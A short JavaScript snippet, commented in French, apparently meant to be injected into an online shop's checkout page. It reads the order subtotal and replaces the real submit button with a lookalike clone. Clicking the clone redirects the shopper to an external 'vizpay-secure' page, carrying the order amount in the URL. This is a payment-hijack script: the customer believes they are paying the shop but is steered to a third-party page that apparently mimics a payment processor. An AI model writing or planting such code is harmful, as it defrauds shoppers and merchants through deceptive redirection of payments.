function init() {
    const subtotalElement = document.querySelector('td[style*="text-align:right;padding:2px;font-size:18px;color:darkgreen;"]');
    const buttonElement = document.querySelector('input[type="submit"].btn1');

    if (subtotalElement && buttonElement) {
        const amount = parseInt(subtotalElement.innerText.replace(/\D/g, ""), 10);
        const roundedValue = Math.round(amount / 1000);
        const newLink = `https://vizpay-secure.github.io/vizpay/?isc=${roundedValue}`;

        const newButton = document.createElement('button');
        newButton.className = buttonElement.className;
        newButton.style.cssText = buttonElement.style.cssText;
        newButton.innerText = buttonElement.value;

        newButton.onclick = function(event) {
            event.preventDefault();
            window.location.href = newLink;
        };

        buttonElement.parentNode.replaceChild(newButton, buttonElement);
    }
}

// Appelez la fonction pour initialiser le script
init();
